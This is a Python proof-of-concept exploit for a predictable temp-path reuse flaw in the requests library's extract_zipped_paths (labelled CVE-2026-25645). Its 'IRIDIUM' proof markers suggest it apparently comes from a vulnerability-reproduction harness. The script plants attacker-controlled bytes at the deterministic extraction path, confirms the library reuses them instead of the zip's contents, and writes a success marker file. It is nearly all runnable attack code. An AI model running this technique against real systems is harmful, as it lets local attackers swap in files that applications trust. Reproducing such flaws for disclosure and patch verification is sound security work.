#!/usr/bin/env python3
"""Predictable-path reuse PoC for requests.utils.extract_zipped_paths (CVE-2026-25645)."""
from __future__ import annotations

import os
import sys
import tempfile
import zipfile
from pathlib import Path

PROOF = Path("/tmp/iridium_proof")
MEMBER = "iridium_race_member"
REPO = os.environ.get("IRIDIUM_REPO_PATH", '/workspace')
sys.path.insert(0, os.path.join(REPO, "src"))

from requests.utils import extract_zipped_paths

tmpdir = tempfile.gettempdir()
predicted = os.path.join(tmpdir, MEMBER)
zip_path = os.path.join(tmpdir, "iridium_race_archive.zip")
fake_zip_member_path = f"{zip_path}/{MEMBER}"
attacker_bytes = b"ATTACKER_CONTROLLED"

with zipfile.ZipFile(zip_path, "w") as zf:
    zf.writestr(MEMBER, b"LEGIT_ZIP_BYTES")

# Attacker plants content at the deterministic extract_zipped_paths target path.
if os.path.lexists(predicted):
    os.unlink(predicted)
with open(predicted, "wb") as planted:
    planted.write(attacker_bytes)

result = extract_zipped_paths(fake_zip_member_path)

if result != predicted:
    raise SystemExit(f"PROOF FAILED: unexpected result path {result!r}")
if Path(predicted).read_bytes() != attacker_bytes:
    raise SystemExit("PROOF FAILED: predictable temp path was overwritten instead of reused")
if attacker_bytes not in Path(predicted).read_bytes():
    raise SystemExit("PROOF FAILED: attacker content missing from reused path")

PROOF.write_bytes(attacker_bytes)
IRIDIUM_POC_SUCCESS = True
print("IRIDIUM_PROOF_CREATED")
